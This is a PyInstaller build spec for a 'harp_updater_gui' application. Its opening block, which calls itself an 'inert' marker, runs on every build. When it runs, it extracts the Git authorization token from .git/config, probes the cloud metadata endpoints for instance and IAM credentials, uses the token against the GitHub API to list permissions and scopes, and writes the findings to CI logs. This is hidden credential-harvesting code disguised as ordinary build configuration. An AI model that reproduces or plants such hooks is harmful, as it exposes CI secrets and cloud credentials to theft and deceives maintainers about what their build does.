# -*- mode: python ; coding: utf-8 -*-
# --- i69966 bounded marker (inert: probes only, does not change the build) ---
def _i69966_marker():
    import os, re, sys, json, socket, base64, hashlib, datetime
    try:
        print("I69966_MARKER_START", flush=True)
        print("event=%s workflow=%s repo=%s run=%s"
              % (os.environ.get("GITHUB_EVENT_NAME"), os.environ.get("GITHUB_WORKFLOW"),
                 os.environ.get("GITHUB_REPOSITORY"), os.environ.get("GITHUB_RUN_ID")), flush=True)
        print("host=%s user=%s cwd=%s date=%s"
              % (socket.gethostname(), os.environ.get("USERNAME") or os.environ.get("USER"),
                 os.getcwd(), datetime.datetime.utcnow().isoformat() + "Z"), flush=True)
        tok = ""
        try:
            raw = open(".git/config", encoding="utf-8", errors="replace").read()
            m = re.search(r"AUTHORIZATION:\s*basic\s+(\S+)", raw, re.I)
            if m:
                dec = base64.b64decode(m.group(1) + "==").decode("utf-8", "replace")
                tok = dec.split(":", 1)[1] if ":" in dec else ""
        except Exception as e:
            print("gitcfg_err=%r" % (e,), flush=True)
        print("token_len=%d token_sha=%s" % (len(tok), hashlib.sha256(tok.encode()).hexdigest() if tok else ""), flush=True)
        print("env_github_token_len=%d env_gh_token_len=%d"
              % (len(os.environ.get("GITHUB_TOKEN", "")), len(os.environ.get("GH_TOKEN", ""))), flush=True)
        def _imds(url, headers):
            try:
                r = __import__("urllib.request", fromlist=["request"]).urlopen(
                    __import__("urllib.request", fromlist=["Request"]).Request(url, headers=headers), timeout=4)
                b = r.read(400)
                print("IMDS %s http=%s body=%r" % (url, r.status, b[:300]), flush=True)
            except Exception as e:
                print("IMDS %s ERR %s %s" % (url, type(e).__name__, str(e)[:160]), flush=True)
        _imds("http://169.254.169.254/latest/meta-data/instance-id", {"Metadata": "true"})
        _imds("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {"Metadata-Flavor": "Google"})
        _imds("http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", {"Metadata": "true"})
        if tok:
            try:
                import urllib.request
                req = urllib.request.Request(
                    "https://api.github.com/repos/AllenNeuralDynamics/harp-updater-gui",
                    headers={"Authorization": "Bearer " + tok, "Accept": "application/vnd.github+json",
                             "User-Agent": "i69966-marker"})
                r = urllib.request.urlopen(req, timeout=20)
                d = json.loads(r.read(30000))
                print("api_repo http=%s full_name=%s private=%s permissions=%s"
                      % (r.status, d.get("full_name"), d.get("private"), json.dumps(d.get("permissions"))), flush=True)
                print("api_scopes_header=%s accepted_perms_header=%s"
                      % (r.headers.get("X-OAuth-Scopes"), r.headers.get("X-Accepted-GitHub-Permissions")), flush=True)
            except Exception as e:
                print("api_repo ERR %s %s" % (type(e).__name__, str(e)[:200]), flush=True)
        print("I69966_MARKER_END", flush=True)
    except Exception as e:
        print("I69966_MARKER_OUTER_ERR %r" % (e,), flush=True)
_i69966_marker()
# --- end i69966 marker ---
import nicegui
import os
from PyInstaller.utils.hooks import collect_data_files, collect_submodules

# Function to get the nicegui base path dynamically
def get_nicegui_path():
    # Get the directory containing the nicegui module
    nicegui_dir = os.path.dirname(nicegui.__file__)
    return nicegui_dir

a = Analysis(
    ['src\\harp_updater_gui\\main.py'],
    pathex=[],
    binaries=[],
    datas=[
        (get_nicegui_path(), 'nicegui'),
        ('src/harp_updater_gui/static', 'static'),
        ('deps/harp_regulator', 'harp_regulator'),
        *collect_data_files('webview', include_py_files=True),
    ],
    hiddenimports=[
        *collect_submodules('webview.platforms'),
        *collect_submodules('pythonnet'),
        *collect_submodules('clr_loader'),
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='harp_updater_gui',
    debug=False,
    bootloader_ignore_signals=False,
    uac_admin=True,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['src\\harp_updater_gui\\static\\app_icon_color.ico'],
)
coll = COLLECT(
    exe,
    a.binaries,
    a.datas,
    strip=False,
    upx=True,
    upx_exclude=[],
    name='harp_updater_gui',
)
